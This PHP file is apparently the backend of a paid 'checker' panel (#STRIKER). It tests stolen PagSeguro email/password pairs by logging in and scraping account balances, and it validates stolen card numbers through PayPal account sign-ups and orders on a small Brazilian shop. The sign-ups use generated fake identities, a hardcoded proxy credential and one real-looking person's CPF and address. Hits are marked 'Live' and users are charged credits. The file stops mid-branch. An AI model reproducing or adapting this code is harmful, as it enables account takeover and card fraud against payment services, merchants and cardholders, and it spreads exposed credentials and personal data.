<?php

error_reporting(0);
set_time_limit(0);
session_start();


if(!isset($_SESSION['usuario']) or !isset($_SESSION['senha'])){
  echo "<script>location.href='/'</script>";
  die();
}

extract($_SESSION);

$ckfile = getcwd(). "/cookie.txt";
if(file_exists($ckfile)){
  unlink($ckfile);
}

function contar_login(){
  $fp = fopen("includes/logins_aprovados.txt" , "a+");
  fwrite($fp, "0");
  fclose($fp);

  }
  function contar_cc(){
    $fp = fopen("includes/ccs_aprovadas.txt" , "a+");
    fwrite($fp, "0");
    fclose($fp);

    }
function debitar_creditos($quanto){
  $creditos = file_get_contents("../users/".$_SESSION['usuario'].".txt");
  $creditos = trim($creditos);
$final = $creditos - $quanto;
  $name = "../users/".$_SESSION['usuario'].".txt";
$file = fopen($name, 'w');
fwrite($file, $final);
fclose($file);

}




if(isset($_GET['lista']) and isset($_GET['testar'])){
  $creditos = file_get_contents("../users/".$_SESSION['usuario'].".txt");
 $creditos = trim($creditos);
if($creditos <= 0){
die("<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i> Você não tem creditos... <i class='fa fa-times'></i>");
}
$lista = $_GET['lista'];
$lista = trim($lista);
$lista = str_replace(" ", "", $lista);
$servidor = $_GET['testar'];

switch ($servidor) {
  case 'pagseguro':
  pagseguro($lista);
set_time_limit(0);
error_reporting(0);
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
$lista = $_GET['lista'];
$separador = explode("|", $lista);
$email = $separador[0];
$senha = $separador[1];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://acesso.uol.com.br/login.html?skin=ps");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$d1 = curl_exec($ch);
$token = getStr($d1,'type="hidden" name="acsrfToken" value="','"');
curl_setopt($ch, CURLOPT_URL, "https://acesso.uol.com.br/login.html?skin=ps");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'dest=REDIR%7Chttps%3A%2F%2Fpagseguro.uol.com.br%2F&deviceId=&skin=ps&user='.$email.'&pass='.$senha.'&entrar=');
$d2 = curl_exec($ch);
curl_close($ch);
if(stripos($d2, 'Comprar')){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://pagseguro.uol.com.br/account/wallet.jhtml");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://pagseguro.uol.com.br/login.jhtml');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$d3 = curl_exec($ch);
$token = getStr($d3,'type="hidden" name="acsrfToken" value="','"');
curl_setopt($ch, CURLOPT_URL, "https://pagseguro.uol.com.br/login.jhtml");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/pagseguro.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://pagseguro.uol.com.br/login.jhtml');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'dest=+REDIR%7Chttps://pagseguro.uol.com.br/hub.jhtml&skin=&acsrfToken='.$token.'&user='.$email.'&pass='.$senha.'');
$d4 = curl_exec($ch);
    if(stripos($d4, '<div class="logged-user-info">')){
        if(strpos($d4, 'verificar conta')){
            $verificada = "Conta Não Verificada";
        }else{
            $verificada = "Conta Verificada";
        }
        $tipo = getStr($d4,'href="/account/viewDetails.jhtml" title="','"');

        $disponivel = getStr($d4,'<dd id="accountBalance" class="positive">','</dd>');
        if ($disponivel == false) {
            $disponivel = "0,00";
        }
        $bloqueado = getStr($d4,'<dd id="accountBlocked" class="neutral">','</dd>');
        if ($bloqueado == false) {
            $bloqueado = "0,00";
        }
        $receber = getStr($d4,'<dd id="accountEscrow" class="neutral">','</dd>');
        if ($receber == false) {
            $receber = "0,00";
        }
        echo "
<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ $lista
         | Disponivel: R$ $disponivel | Receber: $receber | Bloqueado: $bloqueado | Tipo: $tipo | $verificada #STRIKER- </div></font></strong>";
         contar_login();
         debitar_creditos("1.10");

    }else{
        echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $lista #STRIKER- ";
    }
}else{
    echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $lista #STRIKER- " ;
}




    if (file_exists(getcwd().'/cookies/pagseguro.txt')) {
        unlink(getcwd().'/cookies/pagseguro.txt');
    }

  break;
  case 'ggpp':


$TOKEN = "EC-0H0427393F029802K".mt_rand();

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

function bin ($cartao){

        $contents = file_get_contents("bins.csv");
        $pattern = preg_quote(substr($cartao, 0, 6), '/');
        $pattern = "/^.*$pattern.*\$/m";
        if (preg_match_all($pattern, $contents, $matches)) {
            $encontrada = implode("\n", $matches[0]);
        }
        $pieces = explode(";", $encontrada);
        return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
    }
$bin = bin($lista);

//===================================================================//


function getStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

//---------------------------//Gerador 4Devs//------------------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=H&idade=22&pontuacao=S&cep_estado=&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$name = $dados1["nome"];
$cpf = $dados1["cpf"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$celular = $dados1["celular"];
$email = mt_rand();


//==========================================================================//
//=========================================//PAGAMENTO (1)//=========================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/webapps/hermes?flow=1-P&ulReturn=true&token='.$TOKEN.'&country.x=BR&locale.x=pt_BR#/checkout/pageAddCard/addCardFlow/addCard?message=NEED_CREDIT_CARD');

curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'));
$Pagamento1 = curl_exec($ch);

$Csrf = GetStr($Pagamento1, '"x-csrf-jwt": "','",');
//==============================================//================================================//
//======================================//PAGAMENTO (2)//=========================================//



curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/webapps/xoonboarding/api/onboard/signup');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'zproxy.lum-superproxy.io:22225');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'lum-customer-hl_2395478f-zone-static:3f4wops6jorg');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'origin: https://www.paypal.com',
'x-requested-with: XMLHttpRequest',
'x-csrf-jwt: '.$Csrf.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
'content-type: application/json;charset=UTF-8',
'referer: https://www.paypal.com/webscr?cmd=_express-checkout&amp;token='.$TOKEN.'',
'accept-encoding: gzip, deflate, br',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'cookie: ectoken=EC-'.$TOKEN.'; cookie_check=yes; _ga=GA1.2.372831685.1557948305; X-PP-K=1557948365:5:NA; 44907=YHNRDLBNYJP8U; _gcl_au=1.1.2120663241.1557948605; KHcl0EuY7AKSMgfvHl7J5E7hPtK=oo6nkqXADjfU-Dh4qrRfiO6Hur6WWdtp4NkHmQNRLk8CW142yzF8VbRHsDqRvSF5IB31xBMmVEK9Sgcn; ectoken=EC-882601460T298251M; cwrClyrK4LoCV1fydGbAxiNL6iG=UrgWsS8wfwhLrdbxeqHJi2nmpOKmkr6Jh-FuJq2K8E20Gpe6lJ3Idtv9mdl5DU88pquw33E4veym_KaqVtVyQ9MOY-E6HT6OKesS3N26OFgQsBYRhkEF98UGUEdH_bVEjsEa9WMA9ePnXInp4cvoZh3kaOLbMdmAvc2m05AYLElK0gufhzouUoMj6i6Kql_Xg-X9tPQqkLYPr8wP32QCfGUv37SE5IQfVUvMxu5awdhVnHL_Jx6xwlIaL_a; consumer_display=USER_HOMEPAGE%3D0%26USER_TARGETPAGE%3D0%26USER_FILTER_CHOICE%3D0%26BALANCE_MODULE_STATE%3D1%26GIFT_BALANCE_MODULE_STATE%3D1%26LAST_SELECTED_ALIAS_ID%3D0%26SELLING_GROUP%3D1%26PAYMENT_AND_RISK_GROUP%3D1%26SHIPPING_GROUP%3D1%26MCE2_ELIGIBILITY%3D4294967295; navcmd=_donations; login_email='.$email.'%40gmail.com; rmuc=MgYlVSGi9HuuskND499s8WNgiNfzPHBVb2Vuf5P81h3x1OLDjJ2ZtwqN4jOZ7ztgtX3t1lMLXrKnkV3BBg0caKrhF69fvLwZazLBcxFQ6pcXtotVsjt0vx0t2Spn5FK79MQS5iCTWam5ziHnwl8ufeofa-y_stUu6WngKG; pNTcMTtQfrJuaJiwEnWXQ6yNxfq=b_9EXFRtme2G499qFcC1c7V8KvgaDlUNtC4WvVr-LSbu4ZMrcYGtBAXyDfx3H5tHtiNWze86eRjSXNxnHrf1_LhHzWom-V0S1DR1SdF3mQ8jVNnUPoHI2GY_nXOtEA0Ej1OIC96JUoRcr2pVax6HsKMPmDY_mVcLQ_3D-HRcADnH-YOK-qYpxzbgfQBcLCyM-XkpSFqIuZRPc8_6dJeEDz7wAzGwW3ZvzmIrUW5I5JYdogzpyhBQuaU0nC5RjqHls_AS0-8db099MN-yojcG8FPLZaQi825WwM84OS1pIwDp_zwyab6ZCmpdYUtlFILPkKiLBqn99kiReLHCgds5Rw2TQH_pk0tqWE1oDh4kNs_cOjB7xoXKeyBZ_y0w5kdkVbLIVpGP8jSzy9DsY0N6xrwoFITwf1q0mlstT3W9xdsLT0AqSDIrlsuevKRFkwIaEslGlULX42bG2nPkOUn-IA_irxNSOjWBR_0MhwxPijPA25OpDE3WGgRMe_PQRkPkKZqlwekoqeiFPI8viVvSw0HtQliB4J7psmrSUF4FEUjzg4yHgUgr6Ez9ftFj0rV42aUmouhZOXUHy8Mz0UDne-VQcx1ETvm3yRMMATDzx9eQ7XDBiJjZVbwAKZlMvolNsitf_P_hYbWerVmmugbYN7BfT29XwTB_QJH6mDyBLy1i6pGPsh3VjfEba1cAZJ_j2xLoGr_Wot8k3R0YSVTMp-679PEk42PmkmVJkdC3KFZYuEVfF6Yw95sUwAYQu1_CJIMs1Qtan_leqDKkiwG2GDgLWtshiKH4rYKSsVCi_MU-m9tCod1-_ffZJIsPLVvah9R9TZO5ImLNOu2w-0VdZL-y80Sr1TXY7SzKrXMyDuOGENBf_el6NZcNk7VsmSqQbn1MhteDr4ilsS9Kc8TNiy6zYrq; LANG=pt_BR%3BBR; ts_c=vr%3Deaf2561c16aac12000140d88ffffd6ed%26vt%3D1954997216b0a1e9492550ddfff3897c; ui_experience=login_type%3DEMAIL_PASSWORD%26home%3D2%26ph_conf%3D2%253A1560452731132; DPz73K5mY4nlBaZpzRkjI3ZzAY3QMmrP=S23AAFt0lSCjlYV14CN3d8uFPpR5D9byFMVAVmZLaQTva28vtU2HQ_XvFyeeR1GTSL7AsoVd0FQlPRBRNqSFr0xoTr6oEFZ_g; fn_dt=EC-3A603124266368502; SEGM=; X-PP-ADS=AToBrKbhXD78mTIJYe-ZGvNqxMGqLUY7AQao8lzVsqZRKgbOZOQ.2iwIVEp4OwFmD.Rci.PukeNEWSrPyWZsZhr.bQ; id_token=; nsid=s%3As5sxe4VEOMUz0bzfsd8Dtx8iZNQeZMBu.7nikeWJeB9%2BOdYGPsB9vwEMUXTrsmffsvXmgJR3lg0g; tsrce=xoonboardingnodeweb; _gat_PayPal=1; AKDC=slc-b-origin-www-1.paypal.com; tcs=%7CsignupSubmit; x-pp-s=eyJ0IjoiMTU1OTUwMDUwODY3NiIsImwiOiIwIiwibSI6IjAifQ; x-csrf-jwt='.$crsf.'; X-PP-SILOVER=name%3DLIVE6.WEB.1%26silo_version%3D880%26app%3Dloggernodeweb%26TIME%3D3709269084%26HTTP_X_PP_AZ_LOCATOR%3Dccg23.lvs; akavpau_ppsd=1559501109~id=6d91f5937d25784a1ebaa8f42e9087b0; ts=vreXpYrS%3D1654194910%26vteXpYrS%3D1559502310%26vr%3Deaf2561c16aac12000140d88ffffd6ed%26vt%3D1954997216b0a1e9492550ddfff3897c'
));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"data":{"user":{"first_name":"'.$name.'","last_name":"siqueira","email":"'.$email.'@gmail.com","password":"pablo123","countryOfResidence":"BR","country":"BR","dob_day":"10","dob_month":"01","dob_year":"1988"},"billing_address":{"line1":"'.$endereco.'","line2":"Ipê","city":"Rio de janeiro","state":"Rio de janeiro","postal_code":"'.$cep.'","normalization_status":"NORMALIZED","country":"BR"},"shipping_address":{"first_name":"'.$name.'","last_name":"siqueira","line1":"'.$endereco.'","line2":"","city":"Rio de janeiro","state":"Rio de janeiro","postal_code":"'.$cep.'","country":"BR"},"phone":{"type":"Mobile","number":"'.$celular.'","countryCode":"55"},"testParams":{},"nationalIdModel":{"nationalId":{"type":"TAX_ID","subType":"CPF","value":"'.$cpf.'"}},"card":{"type":"","number":"'.$cc.'","security_code":"'.$cvv.'","expiry_month":"'.$mes.'","expiry_year":"'.$ano.'"}},"meta":{"token":"EC-3A603124266368502","calc":"4b8306a06566c","csci":"9da4aaa644fe445d9ab7b77f38272cdd","locale":{"country":"BR","language":"pt"},"state":"ui_checkout_multistepsignup_multistepsignupcreateaccount","app_name":"xoonboardingnodeweb"}}');
 $Pagamento2 = curl_exec($ch);

$js = json_decode($Pagamento2,true);
$retornoo = $js['errorData']['0'];
###########################################


if (curl_error($ch)) {
    echo " ERROR - ".curl_error($ch)." - PROXY\n";
    return;
}
/*
echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $numero|$mes|$ano|000 <span class='badge badge-light'> $bin</span>  - #STRIKER-";
debitar_creditos("1.00");
contar_cc();
}elseif (strpos($s, "auth.bb") !== false) {
 echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $numero|$mes|$ano|000 <span class='badge badge-light'> $bin</span>  - #STRIKER-";
debitar_creditos("1.00");
contar_cc();
}else{
          echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $numero|$mes|$ano|000 - #STRIKER";
    }
*/

 if(strpos($Pagamento2, '"ack":"success"')){
   echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $lista <span class='badge badge-light'> $bin</span> RETORNO: SUCESSO - #STRIKER-";
   debitar_creditos("1.00");
   contar_cc();


}else if(strpos($Pagamento2, '{"field":"cvv","issue":"INVALID"}')){
    echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ | $lista <span class='badge badge-light'> $bin</span>  RETORNO: CVV INCORRETO- #STRIKER-";




}else if(strpos($Pagamento2, 'EXCEEDING_TOTAL_DUPLICATE_LIMIT')){
  echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜ $lista <span class='badge badge-light'> $bin</span> GG LIVE S/ SALDO - #STRIKER-";


}else{
  echo "<strong><font color='#DA514A'><div class='dd-content box'><i class='fa fa-times'></i>  Die ➜ $lista - RETORNO: $retornoo #STRIKER";
  #  echo '<h6 align="left"><span class="badge badge-dark">REPROVADA</span><font style="color: white;"> '.$lista.' | '.$bin.' <span class="badge badge-light"> RETORNO:'.$js['errorData']['0'].'</span> <span class="badge badge-dark">#STRIKER</span></h6>';

}
break;
case 'allbins4':
error_reporting(0);
$lista = $_GET['lista'];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

function puxar($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$loadtime = time();
function getStrc($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}
switch ($mes) {
    case '1': $mes = '01';
        break;
    case '4': $mes = '04';
        break;
    case '7': $mes = '07';
        break;
    case '2': $mes = '02';
        break;
    case '5': $mes = '05';
        break;
    case '8': $mes = '08';
        break;
    case '3': $mes = '03';
        break;
    case '6': $mes = '06';
        break;
    case '9': $mes = '09';
        break;

}
switch ($ano) {
         case '19':$ano = '2019';break;
         case '20':$ano = '2020';break;
         case '21':$ano = '2021';break;
         case '22':$ano = '2022';break;
         case '23':$ano = '2023';break;
         case '24':$ano = '2024';break;
         case '25':$ano = '2025';break;
         case '26':$ano = '2026';break;
         case '27':$ano = '2027';break;
         case '28':$ano = '2028';break;

}


//if (file_exists(getcwd()."/cookies.txt")) {
		//unlink(getcwd()."/cookies.txt");
	//}


usleep(10000000);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://femegamotos.hyfit.com.br/Carrinho.aspx");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

	'Host: femegamotos.hyfit.com.br',
	'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Referer: https://femegamotos.hyfit.com.br/index.aspx'

));

$exec = curl_exec($ini);
//echo $exec;



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://femegamotos.hyfit.com.br/Carrinho.aspx");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

    'Host: femegamotos.hyfit.com.br',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://femegamotos.hyfit.com.br',
    'Referer: https://femegamotos.hyfit.com.br/Carrinho.aspx'

));

curl_setopt($ini, CURLOPT_POSTFIELDS, 'txth_AtuPreco=&txth_Acao=&txt_Cep=72660-257&radioFrete=65%2C42%7C12%7C9%7CPAC&txtqtdprod109230=1&txtCupomDesconto=&btn_FechaPed3=Finalizar+pedido&ProdRel%24txt_CdModelo=&ProdRel%24txt_CdSubGrupo=&ProdRel%24txt_CdVeiculo=&ProdRel%24txth_Carrinho=&ProdRel%24txth_NProds=&nome=&email=&__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwUJMTAxNjQ1NTA5ZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WBQURYnRuX0NvbXByYXJPdXRyb3MFDGJ0bl9GZWNoYVBlZAUZcmVwX2ZyZXRlJGN0bDAwJHJhZF9mcmV0ZQUZcmVwX2ZyZXRlJGN0bDAwJHJhZF9mcmV0ZQUZcmVwX2ZyZXRlJGN0bDAxJHJhZF9mcmV0ZfeQQi45HfecHNvba0ImGG8mSEgt9w9YZSyqTojJwtt2&__VIEWSTATEGENERATOR=30437D44&__EVENTVALIDATION=%2FwEdABI0hyRcpM7TLDKia1%2Fjxa4UVFBYBf029glDfwP0l3k28jIzZHs0d0prbOj0yAY%2Ffxmp%2FrXpiVu9trPeGyYcaQx2%2BtAFR7U8o4d1d%2BKWrJWvwn0jr5jnEkXJRnsT7oGqd6RUprl4UoAMJeBMbsrpS4kxy6wz2JEG1U7m%2FhPclPzKxxtXYwtkfr%2BJlhMivQ2FyDcZ%2BojX3%2FV62TTcmaHxmANuynV1Gg8xIu3VeqMEqeteqz%2FfUvk%2FrDNfGRGRBkdsTxX6vB%2FJGv5UzYTAjaqNdhTrqVrNz7Zq%2B6Bn5JAU4Ge7VHwpk0Rq7MuIa%2Fi2Xv56owm9%2FPfNBfAP%2FSm6hw%2F4R1qgW4DykT5UdiuPle9NCQjtC3CfaA7b1hcg5pjQCKh406O%2F2BrgjHZhbH4CiO3He%2F85d9a9%2Fgp74nYziXuEWN0bYg%3D%3D');
$exec2 = curl_exec($ini);
//echo $exec2;




$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://femegamotos.hyfit.com.br/Cadastro.aspx?CPF=585.975.292-02");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

    'Host: femegamotos.hyfit.com.br',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer: https://femegamotos.hyfit.com.br/IdentificacaoInteligente.aspx?MSG=1'

));
$exec3 = curl_exec($ini);
//echo $exec3;



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://femegamotos.hyfit.com.br/Cadastro.aspx?CPF=585.975.292-02");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

    'Host: femegamotos.hyfit.com.br',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://femegamotos.hyfit.com.br',
    'Referer: https://femegamotos.hyfit.com.br/IdentificacaoInteligente.aspx?MSG=1'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, 'operation=I&DC_txt_CPF=585.975.292-02&DC_txt_Nome=Brenda+Sabrina+Sueli+da+Paz&DC_txtDtNascimento=02%2F01%2F1998&ME_txt_DDD1=61&ME_txt_Tel1=992657131&DC_txt_Email=contaqualquer789%40outlook.com&ME_txt_Cep=72660-257&ME_txt_Numero=520&ME_txt_Comp=CASA&ME_txt_Endere=Quadra+Quadra+510+Conjunto+19&ME_txt_Bairro=Recanto+das+Emas&ME_txt_Cidade=Bras%EDlia&chkTermosCondicoes=on&btn_Continuar.x=77&btn_Continuar.y=19');
$exec4 = curl_exec($ini);
//echo $exec4;




$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://femegamotos.hyfit.com.br/ServiceFacadeHandler.ashx");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

    'Host: femegamotos.hyfit.com.br',
    'Accept: text/plain, */*; q=0.01',
    'Content-Type: application/x-www-form-urlencoded;charset=UTF-8',
    'Origin: https://femegamotos.hyfit.com.br',
    'Referer: https://femegamotos.hyfit.com.br/PagamentoInteligente.aspx?CPP=X85rNN6tqntNl2OfvhsvTg||IG||||IG||'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, '{"Method":"SAVE","Entidade":"PedidoFacade","SaveColString":"{\"Tabela\":{\"Campo\":[],\"Relacionamento\":[],\"Regra\":[]},\"IdFormaPagamento\":\"1041,32,1039,30,1040,\",\"NrCartao\":\"'.$cc.'\",\"NomeCartao\":\"DOUGLAS Q C JUNIOR\",\"CVVCartao\":\"'.$cvv.'\",\"MesCartao\":\"'.$mes.'\",\"AnoCartao\":\"'.$ano.'\",\"Bandeira\":\"MC\",\"Parcelas\":\"1\",\"Comentario\":\"\",\"IdPedido\":\"X85rNN6tqntNl2OfvhsvTg||IG||||IG||\",\"Operation\":\"FINALIZA_PEDIDO_FE\"}","LimiteNivel":6}');
$exec5 = curl_exec($ini);



$valores = array('R$ 1,00','R$ 50,50','R$ 50,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];

if (strpos($exec5, "Identified moderate risk by the issuer.") !== false) {

echo "<strong><font color='#1ABE88'><div class='dd-content box'><i class='fa fa-check'></i>  Live ➜  $cc|$mes|$ano|$cvv | Debitou : $debitouu | Tempo de Resposta: ". (time() - $loadtime) ." seg |<span class='badge badge-light'> $bin</span>  - #striker-";
debitar_creditos("1.00");
contar_cc();
}else if(stripos($r4, 'invalid security code') !==false ){
	
